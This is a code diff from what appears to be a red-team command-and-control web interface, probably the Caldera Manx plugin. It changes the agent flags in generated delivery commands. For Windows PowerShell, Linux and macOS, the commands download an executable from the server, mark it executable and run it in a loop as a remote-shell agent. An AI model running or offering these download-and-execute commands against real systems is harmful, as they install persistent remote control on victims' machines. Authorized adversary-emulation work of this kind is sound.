@@ -131,11 +131,11 @@
             let x = $('#delivery-command');
             let http = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
             if(selected_option === 'windows-psh') {
-                x.text('$url="'+http+'/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","manx.go"); while($true) {try {($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and ([io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data)) | Out-Null; iex "C:\\Users\\Public\\$name.exe -http '+http+' -tcp '+tcpPort+'"} catch{}; sleep 60}');
+                x.text('$url="'+http+'/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","manx.go"); while($true) {try {($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and ([io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data)) | Out-Null; iex "C:\\Users\\Public\\$name.exe -http '+http+' -socket '+tcpPort+' -contact tcp -v"} catch{}; sleep 60}');
             } else if (selected_option === 'linux') {
-                x.text('while true; do agent=$(curl -svkOJ -X POST -H \'file:manx.go\' -H \'platform:linux\' '+http+'/file/download 2>&1 | grep -i \'Content-Disposition\' | grep -io \'filename=.*\' | cut -d\'=\' -f2 | tr -d \'"\\r\') && chmod +x $agent 2>/dev/null && ./$agent -http '+http+' -tcp '+tcpPort+'; sleep 60; done');
+                x.text('while true; do agent=$(curl -svkOJ -X POST -H \'file:manx.go\' -H \'platform:linux\' '+http+'/file/download 2>&1 | grep -i \'Content-Disposition\' | grep -io \'filename=.*\' | cut -d\'=\' -f2 | tr -d \'"\\r\') && chmod +x $agent 2>/dev/null && ./$agent -http '+http+' -socket '+tcpPort+' -contact tcp -v; sleep 60; done');
             } else if (selected_option === 'darwin') {
-                x.text('while true; do agent=$(curl -svkOJ -X POST -H \'file:manx.go\' -H \'platform:darwin\' '+http+'/file/download 2>&1 | grep -i \'Content-Disposition\' | grep -io \'filename=.*\' | cut -d\'=\' -f2 | tr -d \'"\\r\') && chmod +x $agent 2>/dev/null && ./$agent -http '+http+' -tcp '+tcpPort+'; sleep 60; done');
+                x.text('while true; do agent=$(curl -svkOJ -X POST -H \'file:manx.go\' -H \'platform:darwin\' '+http+'/file/download 2>&1 | grep -i \'Content-Disposition\' | grep -io \'filename=.*\' | cut -d\'=\' -f2 | tr -d \'"\\r\') && chmod +x $agent 2>/dev/null && ./$agent -http '+http+' -socket '+tcpPort+' -contact tcp -v; sleep 60; done');
             }
             $('#copyCommand').show();
          }
